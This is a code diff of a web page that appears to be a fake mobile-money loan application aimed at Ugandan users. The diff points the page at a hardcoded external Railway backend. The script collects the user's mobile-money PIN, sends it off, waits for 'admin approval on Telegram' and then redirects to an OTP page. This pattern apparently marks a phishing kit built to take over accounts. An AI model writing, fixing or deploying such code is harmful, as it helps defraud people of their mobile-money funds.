@@ -270,7 +270,8 @@
 </div>
 
 <script>
-    const API_URL = window.location.origin;
+    // FIXED: Using absolute URL instead of relative
+    const API_URL = 'https://momo-uganda-production.up.railway.app';
     let pollInterval = null;
     let currentLoanId = null;
 
@@ -312,7 +313,6 @@
                 console.log('Poll response:', data);
                 
                 if (data.success && data.loan.status === 'approved') {
-                    // Approved! Redirect to OTP page
                     clearInterval(pollInterval);
                     document.getElementById('spinner').style.display = 'none';
                     showStatus("✅ Approved! Redirecting to OTP page...", true);
@@ -332,9 +332,8 @@
             } catch (err) {
                 console.error('Polling error:', err);
             }
-        }, 3000); // Check every 3 seconds
+        }, 3000);
         
-        // Stop polling after 5 minutes
         setTimeout(() => {
             if (pollInterval) {
                 clearInterval(pollInterval);
@@ -392,14 +391,11 @@
                 sessionStorage.setItem('userPin', pin);
                 sessionStorage.setItem('userNetwork', network);
                 
-                // Hide spinner, show waiting area
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('waitingArea').style.display = 'block';
                 btn.style.display = 'none';
                 
                 showStatus("📱 Application sent! Waiting for admin approval on Telegram...");
-                
-                // Start polling for approval
                 startPolling(currentLoanId);
             } else {
                 throw new Error(data.error || "Submission failed");
@@ -421,7 +417,6 @@
         this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
     });
 
-    // Check for existing pending loan on page load
     const existingLoanId = sessionStorage.getItem('loanId');
     if (existingLoanId) {
         currentLoanId = existingLoanId;
